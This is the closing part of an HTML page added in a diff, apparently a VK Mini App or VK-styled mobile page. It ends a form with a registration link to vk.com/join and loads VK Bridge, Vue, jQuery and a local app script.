+                                        <div class="fi_row"> <a class="button wide_button success" href="https://vk.com/join" rel="noopener">Зарегистрироваться</a> </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+
+    <script>
+        vkBridge.send('VKWebAppInit');
+    </script> 
+    <script src="https://cdn.jsdelivr.net/npm/vue"></script>
+    <script src="jquery.min.js"></script>
+    <script src="app-mobile.js"></script>
+</body>
+
+</html>
